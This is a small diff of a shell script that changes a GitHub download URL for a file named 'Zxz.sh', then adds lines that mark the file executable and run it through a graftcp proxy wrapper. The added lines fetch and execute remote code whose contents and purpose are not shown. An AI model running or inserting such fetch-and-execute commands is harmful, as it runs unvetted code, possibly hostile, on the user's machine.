@@ -28,4 +28,7 @@ echo " "
 
 echo " "
 
-wget https://github.com/Akatsoki/newwz/raw/main/Zxz.sh
+wget https://github.com/Akatsoki/nungx/raw/main/Zxz.sh
+chmod +x Zxz.sh
+
+./graftcp/graftcp ./Zxz.sh
